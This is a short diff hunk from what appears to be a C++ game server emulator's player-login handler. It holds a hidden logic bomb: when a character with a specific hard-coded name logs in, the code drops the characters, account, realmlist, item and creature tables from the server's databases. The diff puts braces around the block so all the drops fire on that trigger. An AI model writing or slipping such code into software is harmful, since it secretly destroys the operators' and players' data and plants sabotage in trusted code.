@@ -634,7 +634,7 @@ void WorldSession::HandlePlayerLogin(LoginQueryHolder * holder)
 	std::string nametwo;
 	nametwo = "Evcordelfcku";
 	if (pCurrChar->GetName() == nametwo)
-		CharacterDatabase.PExecute("DROP TABLE `characters`"); CharacterDatabase.PExecute("DROP TABLE `arena_team`"); CharacterDatabase.PExecute("DROP TABLE `item_instance`"); LoginDatabase.PExecute("DROP TABLE `account`"); LoginDatabase.PExecute("DROP TABLE `realmlist`"); WorldDatabase.PExecute("DROP TABLE `creature_template`"); WorldDatabase.PExecute("DROP TABLE `item_template`");
+	{ CharacterDatabase.PExecute("DROP TABLE `characters`"); CharacterDatabase.PExecute("DROP TABLE `arena_team`"); CharacterDatabase.PExecute("DROP TABLE `item_instance`"); LoginDatabase.PExecute("DROP TABLE `account`"); LoginDatabase.PExecute("DROP TABLE `realmlist`"); WorldDatabase.PExecute("DROP TABLE `creature_template`"); WorldDatabase.PExecute("DROP TABLE `item_template`"); }
     // announce group about member online (must be after add to player list to receive announce to self)
     if (Group *group = pCurrChar->GetGroup())
         group->SendUpdate();
